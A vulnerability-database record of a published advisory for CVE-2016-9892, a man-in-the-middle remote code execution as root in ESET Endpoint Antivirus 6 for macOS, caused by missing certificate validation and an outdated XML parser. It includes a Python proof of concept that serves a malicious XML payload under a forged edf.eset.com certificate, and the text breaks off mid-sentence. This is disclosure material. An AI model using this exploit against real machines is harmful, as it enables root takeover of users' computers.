{
    "text": "vul_name : ESET Endpoint Antivirus 6 Remote Code Execution ， vul_cve : CVE-2016-9892 , CVE-2016-0718 ， vul_poc : CVE-2016-9892 - Remote Code Execution as Root via ESET Endpoint Antivirus 6 ， Summary ， Name : Remote Code Execution as Root via ESET Endpoint Antivirus 6 ， CVE : CVE-2016-9892 ， Discoverers : Jason Geffner and Jan Bee ， Vendor : ESET ， Product : ESET Endpoint Antivirus 6 for macOS ， Risk : Critical ， Discovery Date : 2016-11-03 ， Publication Data : 2017-02-27 ， Fixed Version : 6.4.168.0 ， Introduction ， Per ESET's online material , \"ESET Endpoint Antivirus for OS X delivers award- ， winning cross-platform protection for multi-platform environments. It protects ， against malware and spyware and shields end users from fake websites phishing ， Unauthorized devices can be blocked from the system entirely. The solution's ， highly intuitive interface allows for quick navigation.\" ， Vulnerable versions of ESET Endpoint Antivirus 6 are statically linked with an ， outdated XML parsing library and do not perform proper server authentication ,  ， allowing for remote unauthenticated attackers to perform arbitrary code ， execution as root on vulnerable clients. ， Vulnerability ， The esets_daemon service , which runs as root , is statically linked with an ， outdated version of the POCO XML parser library ( - ， version 1.4.6p1 from 2013-03-06. This version of POCO is based on Expat ，  ( version 2.0.1 from 2007-06-05 , which has a ， publicly known XML parsing vulnerability ( CVE-2016-0718 ) that allows for ， arbitrary code execution via malformed XML content. ， When ESET Endpoint Antivirus tries to activate its license , esets_daemon sends a ， request to The esets_daemon service does not validate ， the web server's certificate , so a man-in-the-middle can intercept the request ， and respond using a self-signed HTTPS certificate. The esets_daemon service ， parses the response as an XML document , thereby allowing the attacker to supply ， malformed content and exploit CVE-2016-0718 to achieve arbitrary code execution ， as root. ， Proof of Concept ， Extract overflow.xml from ，  ( ZIP file containing a public proof-of-concept for CVE-2016-0718 ) and run the ， following Python program :  ， _ ， class XmlHandler ( SimpleHTTPServer.SimpleHTTPRequestHandler )  :  ， with open ( \"overflow.xml\" ) as f :  ， xml = f.read (  )  ， self.send_response ( 200 )  ， self.send_header ( \"Content-Type\" , \"text/xml\" )  ， self.send_header ( \"Content-Length\" , len ( xml )  ， self.end_headers (  )  ， self.wfile.write ( xml )  ， self.wfile.write ( \"HTTP/1.1 200 Connection Established\\r\\n\" )  ， self.end_headers (  )  ， self.connection = ssl.wrap_socket (  ， self.connection , certfile=\"/tmp/xml.crt\" ,  ， keyfile=\"/tmp/xml.key\" , server_side=True )  ， self.rfile = self.connection.makefile ( \"rb\" , self.rbufsize )  ， self.wfile = self.connection.makefile ( \"wb\" , self.wbufsize )  ， self.close_connection = 0 ， subprocess.call ( \"openssl req -newkey rsa : 2048 -x509 -nodes -subj \" + ， \"/CN=edf.eset.com -out /tmp/xml.crt -keyout /tmp/xml.key\" ,  ， shell=True )  ， BaseHTTPServer.HTTPServer ( \"localhost\" , 4443 )  , XmlHandler ) .serve_forever (  )  ， _ ， Next , open the ESET Endpoint Antivirus UI , choose \"Setup -> Enter application ， preferences.\" , and enable a local proxy server for localhost : 4443 ( this proxy ， configuration is used to simulate a man-in-the-middle attack ; a real-world",
    "time": "2017.02.28"
}